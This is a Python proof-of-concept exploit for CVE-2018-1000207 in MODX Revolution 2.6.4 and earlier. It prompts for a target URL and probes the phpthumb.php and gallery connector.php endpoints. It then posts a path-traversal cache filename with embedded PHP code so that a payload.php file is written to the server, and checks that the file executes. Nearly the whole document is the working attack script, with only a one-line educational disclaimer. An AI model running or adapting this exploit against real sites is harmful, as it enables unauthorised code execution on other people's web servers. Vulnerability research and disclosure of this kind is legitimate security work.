# Date: 2018-07-13
# Exploit Author: Vitalii Rudnykh
# Vendor Homepage: https://modx.com/
# Version: <= 2.6.4
# CVE : CVE-2018-1000207
 
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import os
import requests
from colorama import init, Fore, Style
try:
    init()
 
    def cls():
        os.system(&#039;cls&#039; if os.name == &#039;nt&#039; else &#039;clear&#039;)
 
    cls()
 
    print(Fore.BLUE +
          &#039;################################################################&#039;)
    print(Fore.CYAN +
          &#039;# Proof-Of-Concept for CVE-2018-1000207 (Modx Revolution)&#039;)
    print(&#039;# by Vitalii Rudnykh&#039;)
    print(&#039;# Thanks by AgelNash&#039;)
    print(&#039;# https://github.com/a2u/CVE-2018-1000207/&#039;)
    print(Fore.BLUE +
          &#039;################################################################&#039;)
    print(&#039;Provided only for educational or information purposes&#039;)
    print(Style.RESET_ALL)
    target = input(&#039;Enter target url (example: http(s)://domain.tld/): &#039;)
 
    verify = True
    code = &#039;<?php echo md5(\&#039;a2u\&#039;); unlink($_SERVER[\&#039;SCRIPT_FILENAME\&#039;]);?>&#039;
 
    if requests.get(
            target + &#039;/connectors/system/phpthumb.php&#039;,
            verify=verify).status_code != 404:
        print(Fore.GREEN + &#039;/connectors/system/phpthumb.php - found&#039;)
        url = target + &#039;/connectors/system/phpthumb.php&#039;
        payload = {
            &#039;ctx&#039;: &#039;web&#039;,
            &#039;cache_filename&#039;: &#039;../../payload.php&#039;,
            &#039;useRawIMoutput&#039;: &#039;1&#039;,
            &#039;src&#039;: &#039;.&#039;,
            &#039;IMresizedData&#039;: code,
        }
 
        r = requests.post(url, data=payload, verify=verify)
        check = requests.get(target + &#039;payload.php&#039;, verify=verify)
        if check.text == &#039;9bdc11de19fd93975bf9c9ec3dd7292d&#039;:
            print(Fore.GREEN + &#039;Exploitable!\n&#039;)
        else:
            print(Fore.RED + &#039;Not exploitable!\n&#039;)
    else:
        print(Fore.RED + &#039;phpthumb.php - not found&#039;)
 
    if requests.get(
            target + &#039;/assets/components/gallery/connector.php&#039;,
            verify=verify).status_code != 404:
        print(Fore.GREEN + &#039;/assets/components/gallery/connector.php - found&#039;)
        url = target + &#039;/assets/components/gallery/connector.php&#039;
 
        payload = {
            &#039;action&#039;: &#039;web/phpthumb&#039;,
            &#039;f&#039;: &#039;php&#039;,
            &#039;useRawIMoutput&#039;: &#039;1&#039;,
            &#039;IMresizedData&#039;: &#039;Ok&#039;,
        }
        r = requests.post(url, data=payload, verify=verify)
        if r.text == &#039;Ok&#039;:
            print(Fore.GREEN + &#039;Exploitable!\n&#039;)
        else:
            print(Fore.RED + &#039;Not exploitable!\n&#039;)
 
    else:
        print(
            Fore.RED + &#039;/assets/components/gallery/connector.php - not found&#039;)
 
except KeyboardInterrupt:
    cls()

